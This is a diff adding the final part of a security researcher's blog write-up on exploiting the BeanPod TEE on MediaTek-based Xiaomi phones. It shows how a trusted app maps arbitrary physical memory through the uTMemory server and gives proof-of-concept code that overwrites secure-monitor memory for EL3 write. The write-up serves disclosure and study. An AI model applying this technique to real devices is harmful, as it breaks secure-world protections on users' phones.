@@ -470,11 +470,70 @@ do_fopen_manual(lib_tvm_sst_base, file_path_, 280);</code></pre>
 
     <p>The sst-server has a number of capabilities our TA does not have, by exploiting this stack overflow we could escalate capabilities. However finalizing the exploit for the TA was already annoying enough I did not feel like exploiting the overflow to achieve shellcode execution in the sst-server. Instead I looked for another vulnerability. 
 
+    <p>One of the IPC servers that is very interesting is the uTMemory server accessible by the TA via the memory_client(ns). The server has access to the sigma0 IPC. According to the <a href="https://l4re.org/doc/l4re_servers_sigma0.html">documentation</a>, the sigma0 server has access to physical memory and serves as the memory provider. The fact that there is a IPC server that has this capability and is reachable from our TA should set off all alarm bells. By exploiting the uTMemory server we'd get access to all physical memory.
+
+<pre><code class="language-armasm">--------------------------------------------------------------------------------
+--                                utmemory server
+--------------------------------------------------------------------------------
+l:start({
+    caps= {
+        TZ_memory = uTMemory:svr(),
+        TZ_memory_ns= uTMemory_ns:svr(),
+        sigma0 = L4.cast(L4.Proto.Factory, L4.Env.sigma0):create(L4.Proto.Sigma0),
+        test_namespace = test_namespace,
+    },
+    scheduler = L4.Env.user_factory:create(L4.Proto.Scheduler, 0xa0, 0x90),
+    log = {"uTMemory", "Y"},
+}, "rom/uTMemory");</code></pre>
+
+    <p>The client code communicating with the uTMemory server can be found in lib_ree_mem.so. In particular the function ut_pf_mm_map_s wraps the IPC call to the uTMemory server. The function itself is called in libvfs.so in the __map_vfs_share_memory function. This function appearantly maps shared (physical) memory as an alternative communication channel to an IPC server. The ut_pf_mm_map_s internally calls a function with the argument "memory_client" as the first argument. Inspecting this function we find the familiar IPC code, sending an IPC request built from the arguments to the ut_pf_mm_map_s functions to the uTMemory IPC server. Instead of reverse engineering the server I decided to figure out the function signature by reverse engineering the client code in ut_pf_mm_Map_s and __map_vfs_share_memory and simply try mapping some physical memory. The final signature is the following:
+
+<pre><code class="language-armasm">int ut_pf_mm_map_s(int pa_high, int pa_low, int size, int perm, int* va)</code></pre>
+    
+    <p>The function allows specifying a physical address in the first two arguments (the TEE is running with 32 bit but the process is 64bit), along with the size and the target virtual address. I tested if the function would map physical memory by mapping physical address 0x0, which is where the mediatek bootrom should be mapped. And voila it actually worked. At this point it is game over, by mapping physical memory we can overwrite code of the secure monitor and achieve code execution at S-EL3. In the end I did not bother writing shellcode and instead overwrote a logging string in the secure monitor, which is printed whenever the lock button is pressed:
+
+<pre><code class="language-armasm">int lib_ree_mem_base = 0x225000;
+ut_pf_mm_map = lib_ree_mem_base + 0x1164;
+int ut_pf_mm_map_s = lib_ree_mem_base + 0x12e4;
+logprintf1("==== trying ut_pf_mm_map ==== \n");
+logprintf2("ut_pf_mm_map @ 0x%x\n", ut_pf_mm_map);
+int atf_va;
+int map_r;
+// ATF Address
+int pa_high = 0x0;
+int pa_low = 0x48c03000;
+map_r = do_ut_pf_mm_map(ut_pf_mm_map_s, pa_high, pa_low,
+		0x30000, 0x5, &atf_va);
+logprintf2("map result: 0x%x\n", map_r);
+logprintf2("va: 0x%x\n", atf_va);
+if(map_r == 0){
+	dump_memory_int(atf_va, 0x20);
+	dump_memory(atf_va, 0x20);
+	dump_memory_int(atf_va+0xe0, 0x20);
+	int m4u_str = memsearch(atf_va, 0x30000, "m4u_secure_handler_TFA", 22);
+	logprintf2("found addrof m4u str: %x\n", m4u_str);
+	if(m4u_str != 0){
+		dump_memory(m4u_str, 0x20);
+		char* lul = (char*)m4u_str;
+		char* el3_str = "EL3!! ^-^ \n\x00";
+		memcpy(lul, el3_str, 22);
+	} else {
+		logprintf1("failed to find m4u str!\n");
+	}
+}</code></pre>
+
+    <h4>Demo</h4>
+
+    <p>In the demo I run the exploit and the push the power button a bunch of times on the phone to trigger the print.
+
+<video controls width="640" height="360">
+  <source src="ut_pf_mm_map.mp4" type="video/mp4">
+</video>
     
 
     <h2>Conclusion</h2>
-	WIP
-
+    
+    <p>This concludes this excursion into the BeanPod TEE. I hope you enjoyed this writeup. Big shoutout again to Marcel for introducing me to the wonderful world of Android TEEs. The vulnerabilities in this blog have been disclosed in summer 2024. I don't know if they have been fixed but on newer Xiaomi device BeanPod has been replaced by MITEE a Fuchsia! based TEE.
 
   </div>
 </body>
